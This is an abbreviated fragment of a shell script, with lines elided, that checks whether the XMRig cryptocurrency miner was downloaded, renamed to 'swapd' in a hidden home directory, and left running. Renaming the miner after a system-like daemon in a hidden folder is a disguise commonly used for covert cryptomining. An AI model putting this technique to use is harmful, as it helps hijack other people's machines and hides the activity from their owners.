...
echo ""
echo "[*] Checking if xmrig was downloaded properly..."
if [ ! -f "$HOME/.swapd/swapd" ]; then
  ...
  echo "[VERBOSE] ✓ XMRig was downloaded and renamed to swapd successfully!"
...
echo ""
echo "[VERBOSE] Verifying miner is running..."
sleep 2
ps aux | grep -E "[s]wapd" || echo "[WARNING] Swapd process not found!"
